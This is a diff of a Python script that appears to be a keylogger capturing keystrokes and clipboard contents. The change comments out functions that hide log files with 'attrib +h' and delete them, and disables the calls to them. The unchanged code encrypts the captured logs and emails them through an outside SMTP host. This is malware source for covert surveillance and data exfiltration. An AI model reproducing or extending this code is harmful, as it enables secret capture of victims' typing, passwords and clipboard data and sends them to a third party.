@@ -13,44 +13,44 @@ blog_file = "logs.bin"
 bclipBoard_file = "clipBoardLogs.bin"
 
 
-def unhide():
-    if os.path.exists(log_file):
-        os.system(f'attrib -h "{log_file}"')
+# def unhide():
+#     if os.path.exists(log_file):
+#         os.system(f'attrib -h "{log_file}"')
 
-    if os.path.exists(clipBoard_file):
-        os.system(f'attrib -h "{clipBoard_file}"')
+#     if os.path.exists(clipBoard_file):
+#         os.system(f'attrib -h "{clipBoard_file}"')
 
-    if os.path.exists(blog_file):
-        os.system(f'attrib -h "{blog_file}"')
+#     if os.path.exists(blog_file):
+#         os.system(f'attrib -h "{blog_file}"')
 
-    if os.path.exists(bclipBoard_file):
-        os.system(f'attrib -h "{bclipBoard_file}"')
+#     if os.path.exists(bclipBoard_file):
+#         os.system(f'attrib -h "{bclipBoard_file}"')
 
-def hide():
-    if os.path.exists(log_file):
-        os.system(f'attrib +h "{log_file}"')
+# def hide():
+#     if os.path.exists(log_file):
+#         os.system(f'attrib +h "{log_file}"')
 
-    if os.path.exists(clipBoard_file):
-        os.system(f'attrib +h "{clipBoard_file}"')
+#     if os.path.exists(clipBoard_file):
+#         os.system(f'attrib +h "{clipBoard_file}"')
 
-    if os.path.exists(blog_file):
-        os.system(f'attrib +h "{blog_file}"')
+#     if os.path.exists(blog_file):
+#         os.system(f'attrib +h "{blog_file}"')
 
-    if os.path.exists(bclipBoard_file):
-        os.system(f'attrib +h "{bclipBoard_file}"')
+#     if os.path.exists(bclipBoard_file):
+#         os.system(f'attrib +h "{bclipBoard_file}"')
 
-def remove():
-    if os.path.exists(log_file):
-        os.remove(log_file)
+# def remove():
+#     if os.path.exists(log_file):
+#         os.remove(log_file)
 
-    if os.path.exists(clipBoard_file):
-        os.remove(clipBoard_file)
+#     if os.path.exists(clipBoard_file):
+#         os.remove(clipBoard_file)
 
-    if os.path.exists(bclipBoard_file):
-        os.remove(clipBoard_file)
+#     if os.path.exists(bclipBoard_file):
+#         os.remove(clipBoard_file)
 
-    if os.path.exists(blog_file):
-        os.remove(blog_file)
+#     if os.path.exists(blog_file):
+#         os.remove(blog_file)
 
 
 def sendEmail():
@@ -65,7 +65,7 @@ def sendEmail():
         # unhide()
         # os.system(f'attrib -h "{"clipBoardLogs.txt"}"')
 
-    unhide()
+    # unhide()
     nlog_file = encryptContents("logs.txt")
     print(nlog_file)
     nclipBoard_file = encryptContents("clipBoardLogs.txt")
@@ -96,7 +96,7 @@ def sendEmail():
         # if os.path.exists("clipBoardLogs.bin"):
         #     os.system(f'attrib +h "{"clipBoardLogs.bin"}"')
         # hide()
-        hide()
+        # hide()
 
         with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
             server.starttls()
